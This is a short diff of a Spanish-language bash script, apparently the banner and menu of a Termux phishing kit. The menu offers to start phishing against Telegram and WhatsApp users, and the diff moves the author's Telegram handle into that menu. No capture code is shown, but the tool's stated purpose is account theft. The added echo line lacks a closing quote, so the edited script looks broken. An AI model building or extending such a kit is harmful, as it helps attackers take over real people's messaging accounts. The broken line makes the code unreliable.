@@ -2,7 +2,6 @@
 
 function banner(){
 pkg install openssl
-echo -e "t.me/aleHak1x"
 
 echo -e "                                                          "
 echo -e "  \e[1;31m  _______    _     _     _             \e[0m"
@@ -17,6 +16,7 @@ echo -e "  \e[1;31m                                  \e[0m"
 }
 
 function menu(){
+        echo -e "\e[0;35m[\e[0m\e[0;92m01\e[0m\e[0;35m]\e[0m  \e[0;92m t.me/alehak1x
 	clear && banner
 	echo -e "\e[0;35m[\e[0m\e[0;92m01\e[0m\e[0;35m]\e[0m  \e[0;92mIniciar phishing de Telegram\e[0m"
 	echo -e "\e[0;35m[\e[0m\e[0;92m02\e[0m\e[0;35m]\e[0m  \e[0;92mIniciar phishing de Whatsapp\e[0m"
